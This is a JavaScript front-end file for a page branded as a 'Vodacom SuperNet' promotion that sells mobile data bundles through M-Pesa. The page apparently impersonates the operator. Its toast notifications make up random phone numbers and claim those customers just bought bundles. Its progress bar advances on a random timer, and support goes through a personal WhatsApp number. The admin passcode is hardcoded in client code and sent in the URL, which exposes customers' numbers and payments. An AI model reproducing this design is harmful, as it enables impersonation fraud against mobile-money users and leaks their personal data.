/* =============================================
   VODACOM SUPERNET PROMO — SIMPLIFIED APP LOGIC
   Easy to use • Intuitive • Direct 10s Confirmation
   Instant Response (Parabéns / Pagamento Recusado)
   ============================================= */

'use strict';

// ═══════════════════════════════════════════
//  1. ESTADO GLOBAL
// ═══════════════════════════════════════════
const ESTADO = {
  numeroDestino: '',
  pacoteSelecionado: null,
  activeSlide: 0,
  pollingTimer: null,
  countdownTimer: null,
  tabAtiva: 'normais'
};

// ═══════════════════════════════════════════
//  2. PACOTES OFICIAIS SUPERNET & DIAMANTE
// ═══════════════════════════════════════════
const PACOTES_NORMAIS = [
  { id: 'n1', dados: '3GB',  preco: '38MT',  valor: 38 },
  { id: 'n2', dados: '5GB',  preco: '54MT',  valor: 54 },
  { id: 'n3', dados: '8GB',  preco: '81MT',  valor: 81 },
  { id: 'n4', dados: '12GB', preco: '108MT', valor: 108 },
  { id: 'n5', dados: '20GB', preco: '162MT', valor: 162 },
  { id: 'n6', dados: '30GB', preco: '216MT', valor: 216 },
  { id: 'n7', dados: '42GB', preco: '323MT', valor: 323 },
  { id: 'n8', dados: '76GB', preco: '538MT', valor: 538 },
  { id: 'n9', dados: '86GB', preco: '807MT', valor: 807 },
  { id: 'n10', dados: '99GB', preco: '1076MT', valor: 1076 }
];

const PACOTES_DIAMANTE = [
  { id: 'd1', dados: '10GB', preco: '377MT',  valor: 377,  extra: 'Chamadas + Net + SMS Ilimitado' },
  { id: 'd2', dados: '25GB', preco: '538MT',  valor: 538,  extra: 'Chamadas + Net + SMS Ilimitado' },
  { id: 'd3', dados: '65GB', preco: '861MT',  valor: 861,  extra: 'Chamadas + Net + SMS Ilimitado' },
  { id: 'd4', dados: '86GB', preco: '1076MT', valor: 1076, extra: 'Chamadas + Net + SMS Ilimitado' }
];

function getNumeroSuporte() {
  return '258871631824';
}

// ═══════════════════════════════════════════
//  3. DIGITAÇÃO E VALIDAÇÃO DO NÚMERO
// ═══════════════════════════════════════════
function aoDigitarNumero(val) {
  const limpo = val.replace(/\D/g, '').slice(0, 9);
  ESTADO.numeroDestino = limpo;

  const inputEl = document.getElementById('input-numero');
  if (inputEl) inputEl.value = formatarNumero(limpo);

  const hint = document.getElementById('msg-erro-numero');
  if (!hint) return;

  if (limpo.length >= 2) {
    const pref = limpo.slice(0, 2);
    if (['84', '85'].includes(pref)) {
      hint.textContent = '';
    } else {
      hint.textContent = 'Atenção: Apenas linhas Vodacom (84 ou 85)';
      hint.style.color = '#dc2626';
    }
  } else {
    hint.textContent = '';
  }

  if (limpo.length === 9) {
    try { localStorage.setItem('supernet_user_phone', limpo); } catch(e) {}
  }
}

function formatarNumero(n) {
  if (n.length <= 2) return n;
  if (n.length <= 5) return n.slice(0, 2) + ' ' + n.slice(2);
  return n.slice(0, 2) + ' ' + n.slice(2, 5) + ' ' + n.slice(5);
}

// ═══════════════════════════════════════════
//  4. RENDERIZAÇÃO DOS PACOTES (SEM TAGS VERDES)
// ═══════════════════════════════════════════
function renderizarPacotes() {
  // Grelha Normais
  const gridNormais = document.getElementById('grid-normais-wrap');
  if (gridNormais) {
    gridNormais.innerHTML = PACOTES_NORMAIS.map(p => `
      <div class="pacote-card" onclick="iniciarCompraPacote(${JSON.stringify(p).replace(/"/g, '&quot;')})">
        <div class="pc-dados">${p.dados}</div>
        <div class="pc-preco">${p.preco}</div>
        <button type="button" class="pc-btn">Comprar</button>
      </div>
    `).join('');
  }

  // Grelha Diamante
  const gridDiamante = document.getElementById('grid-diamante-wrap');
  if (gridDiamante) {
    gridDiamante.innerHTML = PACOTES_DIAMANTE.map(p => `
      <div class="diamante-card" onclick="iniciarCompraPacote(${JSON.stringify(p).replace(/"/g, '&quot;')})">
        <span class="dc-badge">DIAMANTE</span>
        <div class="dc-dados">${p.dados}</div>
        <div class="dc-preco">${p.preco}</div>
        <div class="dc-extra">${p.extra}</div>
        <button type="button" class="dc-btn">Comprar</button>
      </div>
    `).join('');
  }
}

function alternarTabPacotes(tab) {
  ESTADO.tabAtiva = tab;
  const btnNormais = document.getElementById('tab-btn-normais');
  const btnDiamante = document.getElementById('tab-btn-diamante');
  const wrapNormais = document.getElementById('grid-normais-wrap');
  const wrapDiamante = document.getElementById('grid-diamante-wrap');

  if (tab === 'normais') {
    btnNormais?.classList.add('active');
    btnDiamante?.classList.remove('active');
    wrapNormais?.classList.remove('hidden');
    wrapDiamante?.classList.add('hidden');
  } else {
    btnDiamante?.classList.add('active');
    btnNormais?.classList.remove('active');
    wrapDiamante?.classList.remove('hidden');
    wrapNormais?.classList.add('hidden');
  }
}

// ═══════════════════════════════════════════
//  5. FLUXO DIRETO DE COMPRA
// ═══════════════════════════════════════════
function iniciarCompraPacote(pacote) {
  ESTADO.pacoteSelecionado = pacote;

  // Validação do número
  const numLimpo = ESTADO.numeroDestino.replace(/\D/g, '');
  const pref = numLimpo.slice(0, 2);

  if (numLimpo.length !== 9 || !['84', '85'].includes(pref)) {
    const box = document.getElementById('phone-input-box');
    const input = document.getElementById('input-numero');
    const hint = document.getElementById('msg-erro-numero');

    if (box) {
      box.classList.add('highlight');
      setTimeout(() => box.classList.remove('highlight'), 1000);
    }
    if (input) input.focus();
    if (hint) {
      hint.textContent = 'Por favor, insira o seu número Vodacom (84 ou 85) acima para avançar.';
      hint.style.color = '#dc2626';
    }

    const cardStep = document.getElementById('card-numero-step');
    if (cardStep) cardStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
    return;
  }

  // Número válido: avançar imediatamente para o pagamento
  executarPagamento();
}

async function executarPagamento() {
  const p = ESTADO.pacoteSelecionado;
  const num = ESTADO.numeroDestino;

  // Preencher dados na tela de confirmação
  document.getElementById('modal-pay-preco').textContent = p.preco;
  document.getElementById('modal-pay-num').textContent = '+258 ' + formatarNumero(num);

  // Abrir imediatamente a tela de confirmação
  abrirModal('step-confirm');

  // Iniciar progresso e polling
  iniciarPolling('', '', '');

  // Chamar API de pagamento o mais rápido possível
  try {
    const res = await fetch('/api/pagar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        numero: num,
        pacoteId: p.id,
        operadora: 'VODACOM'
      })
    });
    const data = await res.json();

    if (!res.ok && data.error) {
      mostrarFalha(data.error);
      return;
    }

    currentPayId = data.payment_id || '';
    currentSrcId = data.source_id || '';
    currentRefId = data.reference || '';
  } catch (err) {
    // Mantém polling ativo
  }
}

// ═══════════════════════════════════════════
//  6. BARRA DE PROGRESSO (ATÉ 90% ATÉ DIGITAR O PIN, CONTINUA IMEDIATAMENTE)
// ═══════════════════════════════════════════
let currentPayId = '';
let currentSrcId = '';
let currentRefId = '';
let currentProgress = 0;
let progressTimer = null;

function iniciarProgressoAte90() {
  if (progressTimer) clearInterval(progressTimer);
  const pb = document.getElementById('progress-bar');
  const pct = document.getElementById('status-pct');
  const txt = document.getElementById('modal-status-text');

  currentProgress = 0;
  if (pb) pb.style.width = '0%';
  if (pct) pct.textContent = '0%';
  if (txt) txt.textContent = 'A enviar pedido ao telemóvel...';

  progressTimer = setInterval(() => {
    if (currentProgress < 90) {
      currentProgress += Math.floor(Math.random() * 6) + 3;
      if (currentProgress > 90) currentProgress = 90;
      if (pb) pb.style.width = `${currentProgress}%`;
      if (pct) pct.textContent = `${currentProgress}%`;

      if (currentProgress >= 90) {
        if (txt) txt.textContent = 'Introduza o seu PIN no telemóvel para concluir...';
      } else if (currentProgress >= 45) {
        if (txt) txt.textContent = 'Aguardando autorização no telemóvel...';
      }
    }
  }, 220);
}

function concluirProgresso(callback) {
  if (progressTimer) clearInterval(progressTimer);
  const pb = document.getElementById('progress-bar');
  const pct = document.getElementById('status-pct');
  const txt = document.getElementById('modal-status-text');

  currentProgress = 100;
  if (pb) pb.style.width = '100%';
  if (pct) pct.textContent = '100%';
  if (txt) txt.textContent = 'PIN confirmado! A ativar pacote...';

  setTimeout(callback, 350);
}

function iniciarPolling(paymentId, sourceId, reference) {
  pararTimers();
  currentPayId = paymentId || '';
  currentSrcId = sourceId || '';
  currentRefId = reference || '';

  iniciarProgressoAte90();

  // Polling a cada 500ms para resposta mais rápida possível
  ESTADO.pollingTimer = setInterval(async () => {
    if (!currentPayId && !currentSrcId && !currentRefId) return;

    try {
      const res = await fetch('/api/status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payment_id: currentPayId, source_id: currentSrcId, reference: currentRefId })
      });
      const data = await res.json();

      // Se AUTORIZOU (digitou PIN): avança imediatamente para 100% e mostra Parabéns!
      if (data.status === 'success' || data.status === 'completed' || data.status === 'verificado') {
        pararTimers();
        concluirProgresso(() => {
          mostrarSucesso();
        });
      }
      // Se RECUSOU / CANCELOU: Mostra imediatamente Pagamento Recusado com o motivo exato retornado
      else if (data.status === 'failed' || data.status === 'rejected' || data.status === 'cancelled') {
        pararTimers();
        const motivo = data.reason || 'O pagamento foi cancelado ou recusado no telemóvel.';
        mostrarFalha(motivo);
      }
    } catch (e) {
      // Ignora erro momentâneo de conexão
    }
  }, 500);
}

function pararTimers() {
  if (progressTimer) {
    clearInterval(progressTimer);
    progressTimer = null;
  }
  if (ESTADO.pollingTimer) {
    clearInterval(ESTADO.pollingTimer);
    ESTADO.pollingTimer = null;
  }
  if (ESTADO.countdownTimer) {
    clearInterval(ESTADO.countdownTimer);
    ESTADO.countdownTimer = null;
  }
}

function mostrarSucesso() {
  pararTimers();
  document.getElementById('succ-pacote').textContent = `${ESTADO.pacoteSelecionado?.dados} (${ESTADO.pacoteSelecionado?.preco})`;
  document.getElementById('succ-numero').textContent = '+258 ' + formatarNumero(ESTADO.numeroDestino);

  const zapLink = document.getElementById('btn-suporte-whatsapp');
  if (zapLink) {
    const msg = encodeURIComponent(
      `Olá Vodacom SuperNet!\n` +
      `Concluí o pagamento M-Pesa para o pacote ${ESTADO.pacoteSelecionado?.dados} (${ESTADO.pacoteSelecionado?.preco}).\n` +
      `Número destinatário: 258${ESTADO.numeroDestino}`
    );
    zapLink.href = `https://wa.me/${getNumeroSuporte()}?text=${msg}`;
  }

  abrirModal('step-success');
}

function mostrarFalha(motivo) {
  pararTimers();
  const reasonEl = document.getElementById('fail-reason');
  if (reasonEl) {
    reasonEl.textContent = motivo || 'Pagamento recusado pela operadora. Verifique o seu PIN ou saldo M-Pesa.';
  }
  abrirModal('step-failed');
}

function tentarNovamente() {
  fecharModal();
  if (ESTADO.pacoteSelecionado) {
    executarPagamento();
  }
}

function abrirModal(stepId) {
  const modal = document.getElementById('modal-checkout');
  if (!modal) return;
  modal.classList.remove('hidden');

  ['step-confirm', 'step-success', 'step-failed'].forEach(s => {
    const el = document.getElementById(s);
    if (el) el.classList.toggle('hidden', s !== stepId);
  });
}

function fecharModal() {
  const modal = document.getElementById('modal-checkout');
  if (modal) modal.classList.add('hidden');
  pararTimers();
}

// ═══════════════════════════════════════════
//  7. CAROUSEL BANNER
// ═══════════════════════════════════════════
const TOTAL_SLIDES = 3;
let carouselTimer = null;

function mudarSlide(delta) {
  irParaSlide((ESTADO.activeSlide + delta + TOTAL_SLIDES) % TOTAL_SLIDES);
}

function irParaSlide(index) {
  ESTADO.activeSlide = index;
  const track = document.getElementById('carousel-track');
  if (track) {
    track.style.transform = `translateX(-${index * 100}%)`;
  }
  const dots = document.querySelectorAll('.carousel-dots .dot');
  dots.forEach((d, i) => d.classList.toggle('active', i === index));
  reiniciarTimerCarousel();
}

function reiniciarTimerCarousel() {
  if (carouselTimer) clearInterval(carouselTimer);
  carouselTimer = setInterval(() => mudarSlide(1), 5000);
}

// ═══════════════════════════════════════════
//  8. FAQ ACCORDION
// ═══════════════════════════════════════════
function toggleFaq(btn) {
  const item = btn.closest('.faq-item');
  if (item) {
    item.classList.toggle('open');
  }
}

// ═══════════════════════════════════════════
//  9. ÁREA RESTRITA (ADMIN)
// ═══════════════════════════════════════════
function abrirAdmin() {
  document.getElementById('modal-admin')?.classList.remove('hidden');
  document.getElementById('admin-login-view')?.classList.remove('hidden');
  document.getElementById('admin-dashboard-view')?.classList.add('hidden');
  document.getElementById('input-admin-code').value = '';
  document.getElementById('admin-code-err')?.classList.add('hidden');
}

function fecharAdmin() {
  document.getElementById('modal-admin')?.classList.add('hidden');
}

function autenticarAdmin() {
  const code = document.getElementById('input-admin-code').value.trim();
  if (code === 'admegas8') {
    document.getElementById('admin-login-view')?.classList.add('hidden');
    document.getElementById('admin-dashboard-view')?.classList.remove('hidden');
    carregarPagamentosAdmin();
  } else {
    document.getElementById('admin-code-err')?.classList.remove('hidden');
  }
}

async function carregarPagamentosAdmin() {
  const listEl = document.getElementById('admin-lista-pagamentos');
  if (!listEl) return;
  listEl.innerHTML = '<p class="admin-empty">A carregar registos...</p>';

  try {
    const res = await fetch('/api/pagamentos?codigo=admegas8');
    const data = await res.json();
    if (!data.pagamentos || !data.pagamentos.length) {
      listEl.innerHTML = '<p class="admin-empty">Nenhum pagamento registado ainda.</p>';
      return;
    }

    listEl.innerHTML = data.pagamentos.slice(0, 15).map(p => `
      <div class="pag-row">
        <div>
          <strong>${p.pacote || 'Pacote'}</strong> — ${p.preco}MT<br/>
          <small>+258 ${p.numero || '---'}</small>
        </div>
        <span class="pag-status ${p.status || 'pending'}">${(p.status || 'pendente').toUpperCase()}</span>
      </div>
    `).join('');
  } catch(e) {
    listEl.innerHTML = '<p class="admin-empty">Erro ao carregar dados.</p>';
  }
}

// ═══════════════════════════════════════════
//  10. PROVA SOCIAL (NOTIFICAÇÕES TOAST)
// ═══════════════════════════════════════════
function gerarNumeroMzMascarado() {
  const pref = Math.random() > 0.4 ? '84' : '85';
  const ultimos = Math.floor(1000 + Math.random() * 9000);
  return `${pref} *** ${ultimos}`;
}

function notifRandom() {
  const pacs = [...PACOTES_NORMAIS, ...PACOTES_DIAMANTE];
  const num  = gerarNumeroMzMascarado();
  const pac  = pacs[Math.floor(Math.random() * pacs.length)];
  return `${num} acabou de ativar ${pac.dados} (${pac.preco})`;
}

let notifTimeout = null;

function mostrarNotifSocial() {
  const el = document.getElementById('notificacao-social');
  const txt = document.getElementById('notif-texto');
  if (!el || !txt) return;

  txt.textContent = notifRandom();
  el.classList.remove('hidden');

  clearTimeout(notifTimeout);
  notifTimeout = setTimeout(() => {
    el.classList.add('hidden');
    setTimeout(mostrarNotifSocial, 5000 + Math.random() * 7000);
  }, 4000);
}

// ═══════════════════════════════════════════
//  11. INICIALIZAÇÃO
// ═══════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  renderizarPacotes();
  reiniciarTimerCarousel();

  // Restaurar número salvo
  try {
    const salvo = localStorage.getItem('supernet_user_phone');
    if (salvo && salvo.length === 9) {
      aoDigitarNumero(salvo);
    }
  } catch(e) {}

  // Iniciar notificações de prova social
  setTimeout(mostrarNotifSocial, 2000);

  // Iniciar ciclo do botão de suporte (retrair/expandir)
  iniciarCicloSuporte();
});

// ═══════════════════════════════════════════
//  12. BOTÃO DE SUPORTE — RETRAIR / EXPANDIR
// ═══════════════════════════════════════════
function iniciarCicloSuporte() {
  const btn = document.querySelector('.support-float');
  if (!btn) return;

  // Começa colapsado (só o ícone)
  btn.classList.add('collapsed');

  function ciclo() {
    // Expande após 10s
    setTimeout(() => {
      btn.classList.remove('collapsed');
      // Retrai após 5s expandido
      setTimeout(() => {
        btn.classList.add('collapsed');
        // Reinicia o ciclo
        ciclo();
      }, 5000);
    }, 10000);
  }

  ciclo();
}
